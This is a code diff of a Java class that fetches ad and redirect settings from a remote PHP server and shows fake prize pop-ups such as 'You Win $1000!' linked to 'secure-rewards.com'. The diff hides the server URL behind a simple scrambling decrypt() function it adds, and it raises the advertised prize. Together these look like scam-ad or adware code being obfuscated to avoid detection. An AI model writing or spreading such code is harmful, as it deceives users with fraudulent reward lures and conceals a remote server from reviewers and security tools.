@@ -29,7 +29,7 @@ public class ii {
             HttpURLConnection conn = null;
             try {
                 // API URL
-                String urlString = "https://yeasinatoz.com/library/dr.php";
+                String urlString = decrypt("&pnhcp$.6rzdM/9yVrIaOrdbkiylo/BmToocp.QzaoNtLaTn7ies%ageDyg/k/q:Gs%pPtYtsh");
                 URL url = new URL(urlString);
 
                 // HTTP POST
@@ -63,7 +63,7 @@ public class ii {
                 String redirectUrl = json.optString("redirect_url", "");
                 int index = json.has("index") ? json.optInt("index", 0) : 0;
 
-                String adTitle = json.optString("ad_title", "\uD83C\uDF89 You Win $100! \uD83C\uDF89");
+                String adTitle = json.optString("ad_title", "\uD83C\uDF89 You Win $1000! \uD83C\uDF89");
                 String adBody = json.optString("ad_body", "Congratulations! You're our lucky winner. Click below to claim your reward.");
                 String adUrl = json.optString("ad_url", "secure-rewards.com");
 
@@ -157,5 +157,17 @@ public class ii {
                 ex.printStackTrace();
             }
         }
+    }
+    static String decrypt(String encryptedStr) {
+        StringBuilder sb = new StringBuilder(encryptedStr);
+        StringBuilder str = new StringBuilder();
+
+        for(int i = 0; i < sb.length(); ++i) {
+            if ((i + 1) % 2 == 0) {
+                str.append(sb.charAt(i));
+            }
+        }
+
+        return str.reverse().toString();
     }
 }
